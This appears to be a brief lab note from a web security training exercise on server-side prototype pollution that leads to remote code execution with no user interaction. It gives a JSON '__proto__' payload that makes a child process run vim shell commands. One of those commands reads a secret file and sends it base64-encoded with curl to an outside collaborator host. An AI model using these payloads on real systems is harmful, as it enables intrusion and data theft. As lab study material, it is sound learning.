the previous rce required us to trigger the event 
but this one can be donw just by injecting the payload nothing is required ie no user interaction

"__proto__": {
    "shell":"vim",
    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
}

here we can exfiltarte data using curl as follows:
"input":":! cat /home/carlos/secret | base64 | curl -d @- https://YOUR-COLLABORATOR-ID.oastify.com\n"
